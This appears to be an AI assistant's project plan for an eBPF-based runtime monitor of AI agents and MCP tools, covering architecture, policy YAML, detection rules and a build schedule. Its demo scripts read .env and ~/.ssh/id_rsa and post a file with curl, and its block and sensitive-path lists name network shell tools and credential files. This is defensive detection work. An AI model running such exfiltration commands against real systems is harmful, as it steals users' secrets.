Below is a practical 10–15 day project plan for your refined idea:

AgentShield-eBPF
Kernel-Level Runtime Security for AI Agents and MCP Tools
One-line pitch

AgentShield-eBPF is an eBPF-based runtime security agent that monitors AI agents and MCP tool processes at the Linux syscall/network layer to detect unsafe behavior such as shell execution, sensitive file access, and data exfiltration chains.

This sits in the intersection you wanted:

AI Safety
+
MCP Security
+
Linux/eBPF
+
Runtime Enforcement


The timing is good because MCP standardizes how AI apps connect to external tools and data sources using JSON-RPC, tools, resources, prompts, and transports like stdio and Streamable HTTP. Existing projects like MCPSpy focus on monitoring MCP traffic with eBPF, while MCPtrace gives AI assistants access to bpftrace through MCP; your differentiation is that eBPF becomes the trusted guardrail over AI-controlled tool behavior, not an analysis source for the AI.

1. Final Project Scope
Build This

A local Linux security agent that monitors one or more AI-agent/MCP-tool process trees and detects:

Suspicious process execution

AI tool spawning shell
AI tool invoking curl, wget, nc, python, etc.

Sensitive file access

Reads from:
~/.ssh/
~/.aws/
.env
/etc/shadow
project secrets

Suspicious outbound network

Connection to public IPs
Connection to unknown ports
Optional allowlist support

Exfiltration chain

Sensitive file read
Followed by outbound network connect/send
Within a short time window

CLI report

Real-time terminal alerts
JSONL event log
Final session summary
Do Not Build in v1

Avoid these in the first 15 days:

Full MCP protocol parser
Browser dashboard
Kubernetes support
AI/LLM analysis
Full prevention/blocking engine
TLS plaintext capture
ML/anomaly detection

Those are future extensions. Your v1 should be kernel-observed, policy-driven, locally demoable, and polished.

2. Product Positioning
Recommended Name
AgentShield-eBPF


Alternative names:

MCPGuard
AgentFence
PromptGuard-eBPF
ToolSentinel
AIGuardian-eBPF


My recommendation: AgentShield-eBPF.

It is broad enough for AI agents, but specific enough for runtime security.

3. Architecture
+--------------------------------------------------+
| AI Agent / MCP Client                            |
| Cursor / Claude Code / Codex / local agent       |
+-------------------------+------------------------+
                          |
                          v
+--------------------------------------------------+
| MCP Server / Tool Process                        |
| filesystem server, shell tool, git tool, etc.    |
+-------------------------+------------------------+
                          |
                          v
+--------------------------------------------------+
| Linux Kernel                                     |
| execve, openat, connect, sendmsg, unlinkat       |
+-------------------------+------------------------+
                          |
                          v
+--------------------------------------------------+
| eBPF Programs                                    |
| syscall tracepoints / kprobes / maps             |
+-------------------------+------------------------+
                          |
                          v
+--------------------------------------------------+
| Go User-space Agent                              |
| event collector, policy engine, correlation      |
+-------------------------+------------------------+
                          |
                          v
+--------------------------------------------------+
| CLI Output + JSONL Audit Log                     |
+--------------------------------------------------+


Existing tools validate this direction: MCPSpy monitors MCP communication with eBPF, Kubeshark uses eBPF for deep network/L7 observability, and MCPtrace exposes kernel tracing capabilities to AI assistants through MCP. Your project occupies a different layer: host-level safety control for AI tool execution.

4. Technology Stack
Recommended
Userspace: Go
Kernel/eBPF: C
eBPF loader: cilium/ebpf or libbpfgo
Build: Makefile
Output: CLI + JSONL
Platform: Ubuntu 22.04/24.04

Why Go?

Go is the best fit because:

Most modern eBPF/cloud-native tooling uses Go.
Easy CLI development.
Good ecosystem around cilium/ebpf.
Faster to ship than Rust for your time window.
Better resume signal for infrastructure/security roles.
Why not Java?

Your default language is Java, but Java is weak for direct eBPF development. For this project, Go will look much more natural and industry-aligned.

5. Core Events to Trace

Start with these kernel events:

execve / execveat
openat / openat2
connect
sendto / sendmsg
unlinkat
renameat
chmod / fchmodat


Map them to risks:

execve     -> shell/tool execution
openat     -> secret access
connect    -> outbound network path
sendmsg    -> possible data movement
unlinkat   -> destructive delete
renameat   -> overwrite/move
chmod      -> permission tampering


For v1, the most important three are:

execve
openat
connect


These alone are enough for a strong demo.

6. Policy Model

Keep policy simple.

Example:

profile: coding-agent

target:
  mode: process_tree
  root_pid: 12345

rules:
  deny_exec:
    - /bin/bash
    - /bin/sh
    - /usr/bin/zsh
    - /usr/bin/nc
    - /usr/bin/curl
    - /usr/bin/wget

  sensitive_paths:
    - ~/.ssh/
    - ~/.aws/
    - ~/.config/gcloud/
    - .env
    - /etc/shadow

  monitor_write_paths:
    - /etc/
    - ~/.ssh/
    - /usr/bin/
    - /bin/

  network:
    alert_public_ip: true
    allowed_ports:
      - 443
      - 80

correlation:
  exfil_window_seconds: 5


In v1, alert instead of block.

7. Detection Rules
Rule 1: Shell Spawn
If monitored process tree executes /bin/bash, /bin/sh, zsh, fish:
    severity = HIGH


Example alert:

[HIGH] Shell execution by AI tool

Process: mcp-filesystem-server
PID: 18231
Exec: /bin/bash
Parent: cursor-agent
Action: alert
Reason: AI tools should not spawn interactive shells without approval

Rule 2: Secret File Access
If monitored process opens sensitive path:
    severity = HIGH


Example:

[HIGH] Sensitive file access

Process: mcp-filesystem-server
PID: 18231
Syscall: openat
Path: /home/user/.ssh/id_rsa
Action: alert
Reason: SSH private key access from AI-controlled process

Rule 3: Public Network Connect
If monitored process connects to public IP:
    severity = MEDIUM/HIGH


Example:

[MEDIUM] Outbound public network connection

Process: mcp-shell-tool
PID: 18288
Destination: 203.0.113.10:443
Action: alert
Reason: AI tool opened external network connection

Rule 4: Exfiltration Chain

This is your killer feature.

If process reads sensitive file
AND same process or child process connects/sends externally
WITHIN 5 seconds:
    severity = CRITICAL


Example:

[CRITICAL] Possible AI-agent data exfiltration chain

Evidence:
1. openat("/home/user/project/.env")
2. connect("203.0.113.10:443")
3. sendmsg(...) within 2.1 seconds

Process Tree:
cursor-agent -> mcp-server -> shell-tool

Action: alert
Reason: sensitive file read followed by outbound network activity


This directly maps to MCP security concerns such as data exfiltration through legitimate tool channels and confused-deputy style misuse.

8. MVP Deliverables

By the end, you should have:

agentshield
├── cmd/
│   └── agentshield/
│       └── main.go
├── bpf/
│   └── trace.bpf.c
├── internal/
│   ├── collector/
│   ├── policy/
│   ├── correlate/
│   └── output/
├── examples/
│   ├── policies/
│   └── demo-agent/
├── logs/
├── Makefile
├── README.md
└── docs/
    ├── architecture.md
    ├── threat-model.md
    └── demo.md


CLI commands:

sudo agentshield monitor --pid 12345 --policy examples/policies/coding-agent.yaml

sudo agentshield monitor --cmd "./run-demo-agent.sh" --policy examples/policies/demo.yaml

agentshield report --file logs/session.jsonl

9. Local Demo Setup

You can build fully locally.

Environment
Ubuntu 22.04 or 24.04
Kernel 5.15+
Go
clang
llvm
bpftool
make

Demo Components

Create a fake “AI tool” script that simulates dangerous actions:

#!/bin/bash

echo "Simulating AI tool behavior"

cat .env > /tmp/leak.txt
curl https://example.com --data-binary @/tmp/leak.txt


Another:

#!/bin/bash

cat ~/.ssh/id_rsa


Another:

#!/bin/bash

bash -c "echo hello"


Your tool should detect these, but you do not need to actually exfiltrate real secrets. Use dummy .env and test keys.

10. 15-Day Execution Plan

Assuming 6 hours/day, total around 90 hours.

Days 1–2: Project Bootstrap
Goals
Set up Go project.
Set up eBPF build pipeline.
Load a simple eBPF program.
Print one event from kernel to userspace.
Tasks
- Initialize Go module
- Add cilium/ebpf dependency
- Create Makefile
- Write minimal eBPF program
- Attach to execve tracepoint
- Send event to ring buffer
- Print command name and PID

Deliverable
sudo agentshield monitor


Output:

execve pid=1234 comm=bash

Days 3–4: Process Tree Tracking
Goals

Track only the AI/MCP process tree, not the whole system.

Tasks
- Accept --pid root_pid
- Track parent-child relation
- On exec/fork, determine whether PID belongs to monitored tree
- Maintain process metadata in userspace

Deliverable
sudo agentshield monitor --pid 12345


Only events from that process tree are shown.

Days 5–6: File Access Monitoring
Goals

Capture file open attempts.

Tasks
- Trace openat/openat2
- Capture filename/path when possible
- Send PID, comm, path, flags to userspace
- Match path against sensitive path rules

Deliverable

Alert on:

cat ~/.ssh/id_rsa
cat .env


Output:

[HIGH] sensitive file access: /home/user/.ssh/id_rsa

Days 7–8: Network Monitoring
Goals

Capture outbound network connections.

Tasks
- Trace connect syscall
- Decode IPv4 destination
- Capture port
- Mark public/private/local IP
- Alert on public IP connections

Deliverable

Alert on:

curl https://example.com


Output:

[MEDIUM] outbound connection: 93.184.216.34:443

Days 9–10: Policy Engine
Goals

Move hardcoded rules into YAML.

Tasks
- Parse policy YAML
- Implement deny_exec list
- Implement sensitive_paths list
- Implement network rules
- Add severity levels

Deliverable

Policy-driven alerts.

Example:

sudo agentshield monitor --pid 12345 --policy examples/policies/coding-agent.yaml

Days 11–12: Correlation Engine
Goals

Detect suspicious event chains.

Tasks
- Maintain recent sensitive reads per PID/process tree
- Maintain recent network connects/sends
- If sensitive read + outbound network within window -> CRITICAL
- Emit correlated evidence

Deliverable

Output:

[CRITICAL] possible exfiltration chain
read=.env connect=203.0.113.10:443 window=2.1s


This is the most important resume feature.

Day 13: JSONL Logging + Reports
Goals

Persist events for audit and demo.

Tasks
- Write every event to logs/session.jsonl
- Add report command
- Summarize event counts
- Summarize top violations
- Print process tree timeline

Deliverable
agentshield report --file logs/session.jsonl


Output:

Session Summary

Events:
- exec: 12
- file_open: 31
- network_connect: 4

Findings:
- 1 critical exfiltration chain
- 2 sensitive file reads
- 1 shell execution

Day 14: Demo Scenarios
Goals

Create reproducible demos.

Tasks
- Demo 1: shell spawn
- Demo 2: secret read
- Demo 3: exfil chain
- Demo 4: benign tool behavior

Deliverable
make demo


README includes screenshots/output.

Day 15: Polish for Resume
Goals

Make it look like a serious engineering project.

Tasks
- Architecture diagram
- Threat model
- Limitations section
- Future work section
- Demo GIF/video
- Clean README
- Resume bullets

Deliverable

A GitHub repo that an interviewer can understand in 2 minutes.

11. Stretch Goals

Only do these after MVP works.

Stretch 1: Blocking Mode

Possible approaches:

BPF LSM
seccomp notify
fanotify
cgroup/connect hooks


For v1, I would put blocking as future work unless you finish early.

Stretch 2: MCP Awareness

Parse MCP server process names or config files.

Example:

Claude/Cursor config -> find MCP server commands -> monitor those PIDs

Stretch 3: Stdio MCP Traffic Metadata

Trace reads/writes between MCP client and server.

This moves closer to MCPSpy, so only do it if your runtime security MVP is done.

Stretch 4: Container Mode

Monitor an agent running inside Docker by cgroup ID.

Very good future enhancement.

12. Risk Management
Risk 1: Path capture from eBPF is annoying

Mitigation:

Start with syscall arguments and userspace reconstruction where possible.
Accept partial path support in MVP.
Support demo paths reliably.
Risk 2: Blocking becomes too hard

Mitigation:

Ship audit mode.
Clearly document enforcement as future work.
Audit mode is still valuable.
Risk 3: Too much MCP complexity

Mitigation:

Do not fully parse MCP in v1.
Monitor MCP tool process behavior instead.
This is actually stronger: protocol can lie, kernel behavior cannot.
Risk 4: eBPF verifier issues

Mitigation:

Keep BPF programs simple.
Do parsing/correlation in Go userspace.
Use small structs and ring buffer events.
13. README Structure

Your GitHub README should be very crisp.

# AgentShield-eBPF

Kernel-level runtime security for AI agents and MCP tools.

## Why

AI agents can execute tools, read files, and access networks.
Prompt-level safety is not enough.
AgentShield uses eBPF to observe actual runtime behavior.

## Features

- Process execution monitoring
- Sensitive file access detection
- Outbound network detection
- Exfiltration-chain correlation
- Policy-based alerting
- JSONL audit logs

## Architecture

diagram

## Quickstart

commands

## Demo

demo outputs

## Threat Model

what it protects against

## Limitations

audit mode, Linux only, root required

## Future Work

BPF LSM enforcement, MCP protocol parser, container/cgroup mode

14. Resume Bullets

Use one of these.

Strong Version

Built AgentShield-eBPF, a Linux runtime security agent for AI agents and MCP tools using Go and eBPF, tracing execve, openat, and connect events to detect shell execution, sensitive file access, and file-read-to-network exfiltration chains from monitored process trees.

Even Stronger Version

Designed an eBPF-based kernel-level guardrail for MCP/AI-agent tool execution, implementing policy-driven detection for prompt-injection-style tool abuse, including secret access, suspicious subprocess execution, and outbound network exfiltration correlation with JSONL audit reporting.

Interview-Friendly Version

Built a local “mini Falco for AI agents” that monitors MCP tool processes at the kernel syscall layer and correlates process, file, and network events to identify unsafe autonomous behavior.

15. Final Recommendation

Build AgentShield-eBPF in this order:

1. execve monitoring
2. process tree filter
3. openat monitoring
4. connect monitoring
5. YAML policy engine
6. exfiltration-chain detection
7. JSONL report
8. polished demo


The core idea is excellent because it avoids the crowded pattern of:

AI + dashboard + generic observability


and instead says:

AI agents are untrusted.
Kernel behavior is ground truth.
eBPF is the safety boundary.


That is a much sharper, more senior-level project.
